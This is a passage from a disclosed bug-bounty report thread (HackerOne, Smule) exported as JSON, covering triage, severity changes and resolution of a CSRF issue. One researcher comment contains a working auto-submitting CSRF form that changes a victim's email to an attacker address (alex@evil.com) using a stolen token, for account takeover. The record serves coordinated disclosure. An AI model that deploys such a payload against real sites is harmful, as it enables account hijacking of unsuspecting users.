          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/437/770/9737918a459a512076f0a4ac41b2de0a040f1a1c/user.zip?response-content-disposition=attachment%3B%20filename%3D%22user.zip%22%3B%20filename%2A%3DUTF-8%27%27user.zip&response-content-type=application%2Fzip&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWZRWVQLW%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T074136Z&X-Amz-Expires=849&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIH4h5RU%2BpbI3mlwEISZD1G9BopBv%2B7sztLbJknQb99SoAiEAvhxLWqtVFV73maMS53mFspg5vBZ3%2BzoNHXmSke7DMlAqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDC7pogsWvzjWL290gCqPBTKeeZOA278oY6KnHe%2FmWuxZ3Qva3oIxiPgSeceppHqQhkbgfD3tsY8pCoJ9VsxHzSlUT0PRdOuJ8sr7ZKZL2JXBIQSfFD%2FndZi2qU1cFtihzUpwWYUUNN5iSpcUDdb5QDC4CvgOQ%2BEvd6tX7y%2F6Q%2BSMOg8q7yp5mzJr5qbY%2BWMbL6nz%2Buay4cd0wnSe6tkjuaJ1NIbjxSdH9CbkBS0XoTSgIOBDeBGuSMPeOJAc2qCCwB3%2FJJzjHbb07dimFwcVQ37AzR3aSdVTIrEy7NTVExSsa71AnpdGMfq2ZWxbVHT4Z6Ep3h5g9prjvXQKlNKYdiX%2BmlPln5qCDc8s7M8gON6CdSii7fH0aBOcu0INjoa4dc%2FOKcwiuirhI9fDfGn4h4w3t9xVEOfQ21OzAu6iCzqwbyX6FcQTYmc1%2FIb4Lr%2BmfHmZPXpM41HYMK9XHVWPs5aSmF5nYp0DtlX53W%2FJIPEUayublSARs02HeVHIz1vwC6fhS3x1128WqIIvz2dgsHmVJmC%2Bi%2BMemNKEsdiaq0lMgNiTe9mDem3SLrvYMO99wYuebZUfCAVBbqea6mN0o6TtPR%2BY4ZiZl0Y57HEgt3yLwEJQ3BmwdmweldY92DYxW1o1ozabvAsUO6MT%2BEI0mkI2tmtaZQ%2B31bwtxLouobN%2FxkZiIs9YPexJAJ6%2F1%2BFYr5HPRh8rib2vpmO4ylsOFgCISJP5yPdziLDBPihHZhMx8CE858zkJIqVtEFfXZ31W%2FNw09acXa5I4%2BC8AMnDBWV%2FqsryQDDwWpVkzUyRJroktjLT8m7IUEVkEXb7s2GO%2BJiidEBoinU5YgVGpMWTmAmcjaFhRA%2FpwdFI%2F7XHri8KUlyGWMlbYK2BDuF74uow5IK5qAY6sQGceMO9KGy75rSGSK9Jhffgp6ECN8Mwct472Z1JRwqPxCECpo4hAM%2BTiqPzt7Rc8yOTYkRKOicKyCebEt1uytTR6HQoyEcj%2FTBDmV%2BwTAA3FljzwsKBDHTaYj%2Bd0h8rsm4W%2BKtqjUgQ%2BsI4FzYNCv9BSWMF%2FnJ7wV%2BwaSDW1OYbdFVrBpkgTxJPCiLvqlbbKjcH%2BuE8HtSqJR%2FjUt%2Bvxx4CmAPJl%2BJDFQWASMAeV4kuGCM%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ebe527c79e7ad4eecb4a5b74d13277435c7ce59b9b505bc4266c0cf48dde1938"
        },
        {
          "id": 437756,
          "filename": "login.png",
          "type": "image/png",
          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/437/756/9952a8b296b2bcaf5505f6264d7d8e49bf699933/login.png?response-content-disposition=attachment%3B%20filename%3D%22login.png%22%3B%20filename%2A%3DUTF-8%27%27login.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWZRWVQLW%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T074136Z&X-Amz-Expires=849&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIH4h5RU%2BpbI3mlwEISZD1G9BopBv%2B7sztLbJknQb99SoAiEAvhxLWqtVFV73maMS53mFspg5vBZ3%2BzoNHXmSke7DMlAqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDC7pogsWvzjWL290gCqPBTKeeZOA278oY6KnHe%2FmWuxZ3Qva3oIxiPgSeceppHqQhkbgfD3tsY8pCoJ9VsxHzSlUT0PRdOuJ8sr7ZKZL2JXBIQSfFD%2FndZi2qU1cFtihzUpwWYUUNN5iSpcUDdb5QDC4CvgOQ%2BEvd6tX7y%2F6Q%2BSMOg8q7yp5mzJr5qbY%2BWMbL6nz%2Buay4cd0wnSe6tkjuaJ1NIbjxSdH9CbkBS0XoTSgIOBDeBGuSMPeOJAc2qCCwB3%2FJJzjHbb07dimFwcVQ37AzR3aSdVTIrEy7NTVExSsa71AnpdGMfq2ZWxbVHT4Z6Ep3h5g9prjvXQKlNKYdiX%2BmlPln5qCDc8s7M8gON6CdSii7fH0aBOcu0INjoa4dc%2FOKcwiuirhI9fDfGn4h4w3t9xVEOfQ21OzAu6iCzqwbyX6FcQTYmc1%2FIb4Lr%2BmfHmZPXpM41HYMK9XHVWPs5aSmF5nYp0DtlX53W%2FJIPEUayublSARs02HeVHIz1vwC6fhS3x1128WqIIvz2dgsHmVJmC%2Bi%2BMemNKEsdiaq0lMgNiTe9mDem3SLrvYMO99wYuebZUfCAVBbqea6mN0o6TtPR%2BY4ZiZl0Y57HEgt3yLwEJQ3BmwdmweldY92DYxW1o1ozabvAsUO6MT%2BEI0mkI2tmtaZQ%2B31bwtxLouobN%2FxkZiIs9YPexJAJ6%2F1%2BFYr5HPRh8rib2vpmO4ylsOFgCISJP5yPdziLDBPihHZhMx8CE858zkJIqVtEFfXZ31W%2FNw09acXa5I4%2BC8AMnDBWV%2FqsryQDDwWpVkzUyRJroktjLT8m7IUEVkEXb7s2GO%2BJiidEBoinU5YgVGpMWTmAmcjaFhRA%2FpwdFI%2F7XHri8KUlyGWMlbYK2BDuF74uow5IK5qAY6sQGceMO9KGy75rSGSK9Jhffgp6ECN8Mwct472Z1JRwqPxCECpo4hAM%2BTiqPzt7Rc8yOTYkRKOicKyCebEt1uytTR6HQoyEcj%2FTBDmV%2BwTAA3FljzwsKBDHTaYj%2Bd0h8rsm4W%2BKtqjUgQ%2BsI4FzYNCv9BSWMF%2FnJ7wV%2BwaSDW1OYbdFVrBpkgTxJPCiLvqlbbKjcH%2BuE8HtSqJR%2FjUt%2Bvxx4CmAPJl%2BJDFQWASMAeV4kuGCM%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c48c94cb405f7f24334cef04e237d710fe2d6cf255e29996268211ea868f60aa"
        },
        {
          "id": 437751,
          "filename": "request1.png",
          "type": "image/png",
          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/437/751/053a6664b739a74d054e0afd083dd0f1390828bf/request1.png?response-content-disposition=attachment%3B%20filename%3D%22request1.png%22%3B%20filename%2A%3DUTF-8%27%27request1.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWZRWVQLW%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T074136Z&X-Amz-Expires=849&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIH4h5RU%2BpbI3mlwEISZD1G9BopBv%2B7sztLbJknQb99SoAiEAvhxLWqtVFV73maMS53mFspg5vBZ3%2BzoNHXmSke7DMlAqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDC7pogsWvzjWL290gCqPBTKeeZOA278oY6KnHe%2FmWuxZ3Qva3oIxiPgSeceppHqQhkbgfD3tsY8pCoJ9VsxHzSlUT0PRdOuJ8sr7ZKZL2JXBIQSfFD%2FndZi2qU1cFtihzUpwWYUUNN5iSpcUDdb5QDC4CvgOQ%2BEvd6tX7y%2F6Q%2BSMOg8q7yp5mzJr5qbY%2BWMbL6nz%2Buay4cd0wnSe6tkjuaJ1NIbjxSdH9CbkBS0XoTSgIOBDeBGuSMPeOJAc2qCCwB3%2FJJzjHbb07dimFwcVQ37AzR3aSdVTIrEy7NTVExSsa71AnpdGMfq2ZWxbVHT4Z6Ep3h5g9prjvXQKlNKYdiX%2BmlPln5qCDc8s7M8gON6CdSii7fH0aBOcu0INjoa4dc%2FOKcwiuirhI9fDfGn4h4w3t9xVEOfQ21OzAu6iCzqwbyX6FcQTYmc1%2FIb4Lr%2BmfHmZPXpM41HYMK9XHVWPs5aSmF5nYp0DtlX53W%2FJIPEUayublSARs02HeVHIz1vwC6fhS3x1128WqIIvz2dgsHmVJmC%2Bi%2BMemNKEsdiaq0lMgNiTe9mDem3SLrvYMO99wYuebZUfCAVBbqea6mN0o6TtPR%2BY4ZiZl0Y57HEgt3yLwEJQ3BmwdmweldY92DYxW1o1ozabvAsUO6MT%2BEI0mkI2tmtaZQ%2B31bwtxLouobN%2FxkZiIs9YPexJAJ6%2F1%2BFYr5HPRh8rib2vpmO4ylsOFgCISJP5yPdziLDBPihHZhMx8CE858zkJIqVtEFfXZ31W%2FNw09acXa5I4%2BC8AMnDBWV%2FqsryQDDwWpVkzUyRJroktjLT8m7IUEVkEXb7s2GO%2BJiidEBoinU5YgVGpMWTmAmcjaFhRA%2FpwdFI%2F7XHri8KUlyGWMlbYK2BDuF74uow5IK5qAY6sQGceMO9KGy75rSGSK9Jhffgp6ECN8Mwct472Z1JRwqPxCECpo4hAM%2BTiqPzt7Rc8yOTYkRKOicKyCebEt1uytTR6HQoyEcj%2FTBDmV%2BwTAA3FljzwsKBDHTaYj%2Bd0h8rsm4W%2BKtqjUgQ%2BsI4FzYNCv9BSWMF%2FnJ7wV%2BwaSDW1OYbdFVrBpkgTxJPCiLvqlbbKjcH%2BuE8HtSqJR%2FjUt%2Bvxx4CmAPJl%2BJDFQWASMAeV4kuGCM%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b3ad99dc3b8d76feb531fb0886eb660b41bfda8cf602493a57f98d732d57684d"
        }
      ],
      "genius_execution_id": null,
      "team_handle": "smule"
    },
    {
      "id": 4304485,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Any updates??",
      "automated_response": false,
      "created_at": "2019-03-12T04:48:06.858Z",
      "updated_at": "2019-03-12T04:48:06.858Z",
      "actor": {
        "username": "d3f4u17",
        "cleared": true,
        "verified": true,
        "url": "/d3f4u17",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/WVQ792pdimTiEpL8JcJVzyrn/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "smule"
    },
    {
      "id": 4344997,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugTriaged",
      "message": "This issue has been verified and sent to engineering for remediation.  The issue is with lower priority if you don't provide PoC to bypass CSRF protection.  Thank you for your report. ",
      "automated_response": false,
      "created_at": "2019-03-18T12:01:28.487Z",
      "updated_at": "2019-03-18T12:01:28.487Z",
      "actor": {
        "username": "klm",
        "cleared": false,
        "verified": false,
        "url": "/klm",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "smule"
    },
    {
      "id": 4345002,
      "is_internal": false,
      "editable": false,
      "type": "Activities::ReportSeverityUpdated",
      "message": "",
      "automated_response": false,
      "created_at": "2019-03-18T12:02:10.749Z",
      "updated_at": "2019-03-18T12:02:10.749Z",
      "additional_data": {
        "old_severity": "Medium",
        "new_severity": "Low",
        "old_severity_id": 306710,
        "new_severity_id": 318279
      },
      "actor": {
        "username": "klm",
        "cleared": false,
        "verified": false,
        "url": "/klm",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "smule"
    },
    {
      "id": 4659397,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "This issue is still in progress. Apparently it has to do with an issue from a higher level library that we're working out.",
      "automated_response": false,
      "created_at": "2019-04-29T08:17:06.767Z",
      "updated_at": "2019-04-29T08:17:06.767Z",
      "actor": {
        "username": "shakataganai",
        "cleared": false,
        "verified": false,
        "url": "/shakataganai",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/267/957/76980610f84ca0c4c2eb096e18f21bbbd2c288f1_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "smule"
    },
    {
      "id": 4659404,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Thanks for the update ",
      "automated_response": false,
      "created_at": "2019-04-29T08:19:17.200Z",
      "updated_at": "2019-04-29T08:19:17.200Z",
      "actor": {
        "username": "d3f4u17",
        "cleared": true,
        "verified": true,
        "url": "/d3f4u17",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/WVQ792pdimTiEpL8JcJVzyrn/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "smule"
    },
    {
      "id": 4965146,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "any updates???",
      "automated_response": false,
      "created_at": "2019-06-01T07:43:58.806Z",
      "updated_at": "2019-06-01T07:43:58.806Z",
      "actor": {
        "username": "d3f4u17",
        "cleared": true,
        "verified": true,
        "url": "/d3f4u17",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/WVQ792pdimTiEpL8JcJVzyrn/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "smule"
    },
    {
      "id": 4996384,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Still in progress. As a lower rated vuln, it's lower on the priority list for engineering. But they have stated that they will address it.  Thanks for checkin in!",
      "automated_response": false,
      "created_at": "2019-06-04T20:56:56.150Z",
      "updated_at": "2019-06-04T20:56:56.150Z",
      "actor": {
        "username": "shakataganai",
        "cleared": false,
        "verified": false,
        "url": "/shakataganai",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/267/957/76980610f84ca0c4c2eb096e18f21bbbd2c288f1_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "smule"
    },
    {
      "id": 5000134,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Thanks for the update",
      "automated_response": false,
      "created_at": "2019-06-05T00:58:48.035Z",
      "updated_at": "2019-06-05T00:58:48.035Z",
      "actor": {
        "username": "d3f4u17",
        "cleared": true,
        "verified": true,
        "url": "/d3f4u17",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/WVQ792pdimTiEpL8JcJVzyrn/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "smule"
    },
    {
      "id": 5144432,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hello, I want to extend this report by adding the following:\n\nPreviously I was unable to provide POC for the csrf attack, So I am providing the POC for it, Previously in the report, we saw how the attacker can gain access to user's email and csrf token. Once the attacker gets the token the attacker can easily craft a csrf payload to change the email address of the user which can result in **Complete Account Takeover**.\n\nPOC CSRF\n\n* Add the following code to the file csrf.html\n\n```javascript\n<!DOCTYPE html>\n<head>\n</head>\n<body>\n<form method=\"POST\" action=\"https://www.smule.com/user/update/email\">\n<input type=\"hidden\" name=\"utf-8\" value=\"\">\n<input type=\"hidden\" name=\"authenticity_token\" value=\"{CSRF_TOKEN obtained previously}\">\n<input type=\"hidden\" name=\"email\" value=\"alex@evil.com\">\n<input type=\"hidden\" name=\"email_confirmation\" value=\"alex@evil.com\">\n<input type=\"hidden\" name=\"tz_offset\" value=\"19800\">\n</form>\n<script>\ndocument.forms[0].submit();\n</script>\n</body>\n</html>\n```\n* Replace the value of the `authenticity_token` with the csrf token obtained which was mentioned previously in the report.\n\n* Run the file in a web browser.\n{F513064}\n\n* Visit your profile your email will be changed.\n\n##Impact\n\n* Complete Account takeover.\n\n>I guess the criticality of the report is much higher now, can we change the severity of the report to **HIGH**.\n",
      "automated_response": false,
      "created_at": "2019-06-20T08:01:59.840Z",
      "updated_at": "2019-06-20T08:01:59.840Z",
      "actor": {
        "username": "d3f4u17",
        "cleared": true,
        "verified": true,
        "url": "/d3f4u17",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/WVQ792pdimTiEpL8JcJVzyrn/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "attachments": [
        {
          "id": 513064,
          "filename": "smule_csrf.png",
          "type": "image/png",
          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/513/064/d44c9b81342d8850de3bb08021c6f4cba7ff7d52/smule_csrf.png?response-content-disposition=attachment%3B%20filename%3D%22smule_csrf.png%22%3B%20filename%2A%3DUTF-8%27%27smule_csrf.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWZRWVQLW%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T074136Z&X-Amz-Expires=849&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIH4h5RU%2BpbI3mlwEISZD1G9BopBv%2B7sztLbJknQb99SoAiEAvhxLWqtVFV73maMS53mFspg5vBZ3%2BzoNHXmSke7DMlAqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDC7pogsWvzjWL290gCqPBTKeeZOA278oY6KnHe%2FmWuxZ3Qva3oIxiPgSeceppHqQhkbgfD3tsY8pCoJ9VsxHzSlUT0PRdOuJ8sr7ZKZL2JXBIQSfFD%2FndZi2qU1cFtihzUpwWYUUNN5iSpcUDdb5QDC4CvgOQ%2BEvd6tX7y%2F6Q%2BSMOg8q7yp5mzJr5qbY%2BWMbL6nz%2Buay4cd0wnSe6tkjuaJ1NIbjxSdH9CbkBS0XoTSgIOBDeBGuSMPeOJAc2qCCwB3%2FJJzjHbb07dimFwcVQ37AzR3aSdVTIrEy7NTVExSsa71AnpdGMfq2ZWxbVHT4Z6Ep3h5g9prjvXQKlNKYdiX%2BmlPln5qCDc8s7M8gON6CdSii7fH0aBOcu0INjoa4dc%2FOKcwiuirhI9fDfGn4h4w3t9xVEOfQ21OzAu6iCzqwbyX6FcQTYmc1%2FIb4Lr%2BmfHmZPXpM41HYMK9XHVWPs5aSmF5nYp0DtlX53W%2FJIPEUayublSARs02HeVHIz1vwC6fhS3x1128WqIIvz2dgsHmVJmC%2Bi%2BMemNKEsdiaq0lMgNiTe9mDem3SLrvYMO99wYuebZUfCAVBbqea6mN0o6TtPR%2BY4ZiZl0Y57HEgt3yLwEJQ3BmwdmweldY92DYxW1o1ozabvAsUO6MT%2BEI0mkI2tmtaZQ%2B31bwtxLouobN%2FxkZiIs9YPexJAJ6%2F1%2BFYr5HPRh8rib2vpmO4ylsOFgCISJP5yPdziLDBPihHZhMx8CE858zkJIqVtEFfXZ31W%2FNw09acXa5I4%2BC8AMnDBWV%2FqsryQDDwWpVkzUyRJroktjLT8m7IUEVkEXb7s2GO%2BJiidEBoinU5YgVGpMWTmAmcjaFhRA%2FpwdFI%2F7XHri8KUlyGWMlbYK2BDuF74uow5IK5qAY6sQGceMO9KGy75rSGSK9Jhffgp6ECN8Mwct472Z1JRwqPxCECpo4hAM%2BTiqPzt7Rc8yOTYkRKOicKyCebEt1uytTR6HQoyEcj%2FTBDmV%2BwTAA3FljzwsKBDHTaYj%2Bd0h8rsm4W%2BKtqjUgQ%2BsI4FzYNCv9BSWMF%2FnJ7wV%2BwaSDW1OYbdFVrBpkgTxJPCiLvqlbbKjcH%2BuE8HtSqJR%2FjUt%2Bvxx4CmAPJl%2BJDFQWASMAeV4kuGCM%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5a2365857474e741882ee0d76fe9d95c21f1e71a091798f737c72afa0209c853"
        }
      ],
      "genius_execution_id": null,
      "team_handle": "smule"
    },
    {
      "id": 5153034,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Look at this. Two things come to mind:\n1 - Last week we fixed another issue related to X-Forwarded-Host which may impact if this vuln works, can you verify if you've tested this in the last few days?\n2 - Just to make sure I'm clear you still need to intercept someones request and take their CSRF_TOKEN? Which would require someone being MITM'd over TLS. So their machine would need to be compromised (rouge CA cert) or they'd have to click through scary TLS warnings in their browser.\n\nThanks!",
      "automated_response": false,
      "created_at": "2019-06-20T23:05:52.413Z",
      "updated_at": "2019-06-20T23:05:52.413Z",
      "actor": {
        "username": "shakataganai",
        "cleared": false,
        "verified": false,
        "url": "/shakataganai",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/267/957/76980610f84ca0c4c2eb096e18f21bbbd2c288f1_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "smule"
    },
    {
      "id": 5154313,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hello @shakataganai, I just checked the issue has been fixed now. But can we increase the severity of the report as in the above provided POC the attacker can go for a complete account takeover?\n\nIt would be great if we can increase the impact of the report and then close it as resolved because the issue has been patched.\n\nThanks.",
      "automated_response": false,
      "created_at": "2019-06-21T02:11:47.397Z",
      "updated_at": "2019-06-21T02:12:23.874Z",
      "actor": {
        "username": "d3f4u17",
        "cleared": true,
        "verified": true,
        "url": "/d3f4u17",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/WVQ792pdimTiEpL8JcJVzyrn/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "smule"
    },
    {
      "id": 5154319,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "To fetch the CSRF_TOKEN the attacker needs to intercept the request and add the header to the current request.",
      "automated_response": false,
      "created_at": "2019-06-21T02:15:48.380Z",
      "updated_at": "2019-06-21T02:15:48.380Z",
      "actor": {
        "username": "d3f4u17",
        "cleared": true,
        "verified": true,
        "url": "/d3f4u17",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/WVQ792pdimTiEpL8JcJVzyrn/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "smule"
    },
    {
      "id": 5154867,
      "is_internal": false,
      "editable": false,
      "type": "Activities::ReportSeverityUpdated",
      "message": "",
      "automated_response": false,
      "created_at": "2019-06-21T05:40:34.947Z",
      "updated_at": "2019-06-21T05:40:34.947Z",
      "additional_data": {
        "old_severity": "Low",
        "new_severity": "Medium",
        "old_severity_id": 318279,
        "new_severity_id": 437909
      },
      "actor": {
        "username": "shakataganai",
        "cleared": false,
        "verified": false,
        "url": "/shakataganai",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/267/957/76980610f84ca0c4c2eb096e18f21bbbd2c288f1_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "smule"
    },
    {
      "id": 5154870,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugResolved",
      "message": "Account take over is bad, fully agree. If it requires the user be MITM'd it'd normally be a low graded issue since that requires a lot of external factors. So I'll draw it in the middle and call it medium. I do really appreciate the full POC! Thanks for helping Smule Sing Securely.",
      "automated_response": false,
      "created_at": "2019-06-21T05:41:56.558Z",
      "updated_at": "2019-06-21T05:41:56.558Z",
      "actor": {
        "username": "shakataganai",
        "cleared": false,
        "verified": false,
        "url": "/shakataganai",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/267/957/76980610f84ca0c4c2eb096e18f21bbbd2c288f1_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "reporter": {
        "username": "d3f4u17",
        "url": "/d3f4u17"
      },
      "genius_execution_id": null,
      "team_handle": "smule"
    },
    {
      "id": 5154874,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Thank you very much for increasing the impact to medium, I will keep on updating you guys if I will find more bugs :).",
      "automated_response": false,
      "created_at": "2019-06-21T05:43:54.287Z",
      "updated_at": "2019-06-21T05:43:54.287Z",
      "actor": {
        "username": "d3f4u17",
        "cleared": true,
        "verified": true,
        "url": "/d3f4u17",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/WVQ792pdimTiEpL8JcJVzyrn/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "smule"
    },
    {
      "id": 5154877,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "We greatly appreciate your persistence even with slow-to-warm up resolution!",
      "automated_response": false,
      "created_at": "2019-06-21T05:45:40.996Z",
      "updated_at": "2019-06-21T05:45:40.996Z",
      "actor": {
        "username": "shakataganai",
        "cleared": false,
        "verified": false,
        "url": "/shakataganai",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/267/957/76980610f84ca0c4c2eb096e18f21bbbd2c288f1_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "smule"
    },
    {
      "id": 5154882,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hey I have a question, the report is resolved now but it's not appearing in my hacktivity feed or any where else?",
      "automated_response": false,
      "created_at": "2019-06-21T05:48:04.153Z",
      "updated_at": "2019-06-21T05:48:04.153Z",
      "actor": {
        "username": "d3f4u17",
        "cleared": true,
        "verified": true,
        "url": "/d3f4u17",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/WVQ792pdimTiEpL8JcJVzyrn/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "smule"
    },
    {
      "id": 5154953,
      "is_internal": false,
      "editable": false,
      "type": "Activities::AgreedOnGoingPublic",
      "message": "It would be great if will do a disclosure to empower our community :)",
      "automated_response": false,
      "created_at": "2019-06-21T06:17:59.246Z",
      "updated_at": "2019-06-21T06:17:59.246Z",
      "first_to_agree": true,
      "actor": {
        "username": "d3f4u17",
        "cleared": true,
        "verified": true,
        "url": "/d3f4u17",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/WVQ792pdimTiEpL8JcJVzyrn/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "smule"
    },
    {
      "id": 5381174,
      "is_internal": false,
      "editable": false,
      "type": "Activities::ReportBecamePublic",
      "message": "",
      "automated_response": false,
      "created_at": "2019-07-21T06:17:59.416Z",
      "updated_at": "2019-07-21T06:17:59.416Z",
      "actor": {
        "url": "/smule",
        "ibb": false,
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/970/86155a522b43459fc587e2ff56745e1f531e823e_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "profile": {
          "name": "Smule"
        }
      },
      "genius_execution_id": null,
      "team_handle": "smule"
    }
  ],
  "activity_page_count": 1,
  "activity_page_number": 1,
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}